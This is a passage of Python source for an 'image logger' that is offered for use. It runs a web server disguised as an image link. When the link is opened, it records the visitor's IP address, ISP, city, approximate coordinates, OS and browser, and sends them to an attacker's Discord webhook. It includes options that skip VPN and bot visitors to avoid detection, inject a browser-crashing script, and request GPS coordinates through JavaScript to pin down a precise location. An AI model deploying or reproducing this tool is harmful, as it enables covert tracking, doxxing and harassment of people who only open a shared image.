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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI

application
